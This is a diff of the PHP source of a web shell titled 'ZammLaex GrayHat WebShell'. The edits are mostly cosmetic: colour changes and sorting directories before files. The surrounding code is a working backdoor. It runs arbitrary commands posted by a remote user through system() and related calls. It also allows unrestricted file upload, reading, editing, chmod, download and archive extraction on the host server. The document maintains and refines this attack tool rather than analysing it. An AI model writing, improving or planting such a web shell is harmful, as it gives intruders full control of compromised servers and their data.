@@ -12,7 +12,7 @@ if (!is_dir($cwd)) $cwd = getcwd();
 chdir($cwd);
 $cwd = str_replace('\\', '/', realpath('.'));
 
-// === Notification ===
+// Notification
 $msg = '';
 function notify($text) {
     return "<div style='color:#0f0;background:#111;padding:5px;margin-bottom:10px;border:1px solid #0f0;'>✅ $text</div>";
@@ -21,7 +21,7 @@ function notifyFail($text) {
     return "<div style='color:#f00;background:#111;padding:5px;margin-bottom:10px;border:1px solid #f00;'>❌ $text</div>";
 }
 
-// === Safe Exec ===
+// Safe Exec
 function safe_exec($cmd) {
     $output = "";
     if (function_exists('system')) {
@@ -40,7 +40,7 @@ function safe_exec($cmd) {
     return $output;
 }
 
-// === Extract ===
+// Extract
 if (isset($_GET['extract'])) {
     $archive = $cwd.'/'.$_GET['extract'];
     $ext = strtolower(pathinfo($archive, PATHINFO_EXTENSION));
@@ -66,10 +66,9 @@ if (isset($_GET['extract'])) {
     }
 }
 
-// === Actions ===
+// Actions
 $output = '';
 if (isset($_POST['exec'])) $output = safe_exec($_POST['exec']);
-
 if (isset($_FILES['upload'])) {
     $dest = $cwd.'/'.$_FILES['upload']['name'];
     if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
@@ -109,7 +108,7 @@ if (isset($_POST['readfile'])) {
     $t = $cwd.'/'.$_POST['readfile'];
     if (is_file($t)) {
         $d = htmlspecialchars(file_get_contents($t));
-        echo "<style>body{background:#000;color:#0ff}</style><form><textarea rows='20' cols='100'>$d</textarea><br><a href='?path=$cwd'>Back</a></form>";
+        echo "<style>body{background:#000;color:#fff}</style><form><textarea rows='20' cols='100'>$d</textarea><br><a href='?path=$cwd'>Back</a></form>";
         exit;
     }
 }
@@ -120,7 +119,7 @@ if (isset($_GET['edit'])) {
         echo "<script>alert('Saved!');window.location='?path=$cwd';</script>";
     }
     $d = htmlspecialchars(file_get_contents($f));
-    echo "<html><head><style>body{background:#000;color:#0ff;font-family:monospace}textarea,input{background:#111;color:#0ff;border:1px solid #0ff}</style></head><body><form method='POST'><h3>Edit: ".basename($f)."</h3><textarea name='content' rows='20' cols='100'>$d</textarea><br><input type='submit' name='save' value='Save'></form></body></html>";
+    echo "<html><head><style>body{background:#000;color:#fff;font-family:monospace}textarea,input{background:#111;color:#fff;border:1px solid #fff}</style></head><body><form method='POST'><h3>Edit: ".basename($f)."</h3><textarea name='content' rows='20' cols='100'>$d</textarea><br><input type='submit' name='save' value='Save'></form></body></html>";
     exit;
 }
 if (isset($_GET['download'])) {
@@ -135,12 +134,20 @@ if (isset($_GET['download'])) {
 // === UI ===
 echo "<html><head><title>ZammLaex GrayHat WebShell</title>
 <style>
-body {background:#000;color:#0ff;font-family:monospace;font-size:15px;}
-input,textarea {background:#111;color:#0ff;border:1px solid #0ff;padding:3px;}
+body {background:#000;color:#fff;font-family:monospace;font-size:15px;}
+input,textarea {background:#111;color:#fff;border:1px solid #fff;padding:3px;}
 a {color:#0ff;text-decoration:none;}
 form {display:inline;}
-th,td {border:1px solid #0ff;padding:3px;vertical-align:middle;}
-button, .btn {background:#111;color:#0ff;border:1px solid #0ff;padding:2px 6px;margin:1px;cursor:pointer;font-size:14px;}
+th,td {border:1px solid #fff;padding:3px;vertical-align:middle;}
+button, .btn {
+    background:#fff !important;
+    color:#000 !important;
+    border: 1px solid #000;
+    padding:2px 6px;
+    margin:1px;
+    cursor:pointer;
+    font-size:14px;
+}
 .grid2 {display:grid;grid-template-columns: 1fr 1fr;gap:10px;margin-top:10px;}
 </style></head><body>";
 
@@ -169,17 +176,22 @@ echo "<form method='POST'><table width=100%><tr><th>#</th><th>Name</th><th>Size<
 $parent = dirname($cwd);
 echo "<tr><td></td><td><a href='?path=".urlencode($parent)."'>..</a></td><td>-</td><td></td></tr>";
 
-foreach(scandir($cwd) as $f){
+$dirs = $files = [];
+foreach (scandir($cwd) as $f) {
     if ($f=="." || $f=="..") continue;
+    if (is_dir($cwd.'/'.$f)) $dirs[] = $f; else $files[] = $f;
+}
+$n = 0;
+foreach (array_merge($dirs, $files) as $f) {
     $p = $cwd.'/'.$f;
     $size = is_file($p)?filesize($p):'-';
     echo "<tr>";
     echo "<td><input type='checkbox' name='sel[]' value='".htmlspecialchars($f)."'></td>";
-    echo "<td>".(is_dir($p) ? "<a href='?path=".urlencode($p)."'>$f</a>" : $f)."</td>";
+    echo "<td>".(is_dir($p) ? "<a href='?path=".urlencode($p)."' style='color:#fff;'>$f</a>" : $f)."</td>";
     echo "<td>$size</td><td>";
-    echo "<form method='POST' style='display:inline'><input type='hidden' name='rename' value='$f'><input type='text' name='rename_to' value='$f' size='10'><button class='btn'>Rename</button></form> ";
+    echo "<form method='POST'><input type='hidden' name='rename' value='$f'><input type='text' name='rename_to' value='$f' size='10'><button class='btn'>Rename</button></form> ";
     if (is_file($p)) echo "<a href='?path=$cwd&edit=$f' class='btn'>Edit</a> ";
-    echo "<form method='POST' style='display:inline'><input type='hidden' name='chmodfile' value='$f'><input type='text' name='chmod' size='4' value='0755'><button class='btn'>Chmod</button></form> ";
+    echo "<form method='POST'><input type='hidden' name='chmodfile' value='$f'><input type='text' name='chmod' size='4' value='0755'><button class='btn'>Chmod</button></form> ";
     if (is_file($p)) echo "<a href='?path=$cwd&download=$f' class='btn'>Download</a> ";
     echo "<span class='btn'>Zip</span> ";
     $lower = strtolower($f);
@@ -196,13 +208,10 @@ echo "</form><hr>";
 echo "<div class='grid2'>
 <form method='POST'><b>Make File:</b><br> <input name='newfile' size='15'><input type='submit' value='✔'></form>
 <form method='POST'><b>Make Dir:</b><br> <input name='newdir' size='15'><input type='submit' value='✔'></form>
-
 <form method='POST'><b>Change Dir:</b><br> <input name='changedir' size='30' value=\"$cwd\"><input type='submit' value='Go'></form>
 <form method='POST'><b>Read File:</b><br> <input name='readfile' size='20'><input type='submit' value='Read'></form>
-
 <form method='POST'><b>Execute:</b><br> <input name='exec' size='30'><input type='submit' value='Run'><br>
 <textarea rows='5' cols='60'>".htmlspecialchars($output)."</textarea></form>
-
 <form method='POST' enctype='multipart/form-data'><b>Upload:</b><br> <input type='file' name='upload'><input type='submit' value='Upload'></form>
 </div>";
 
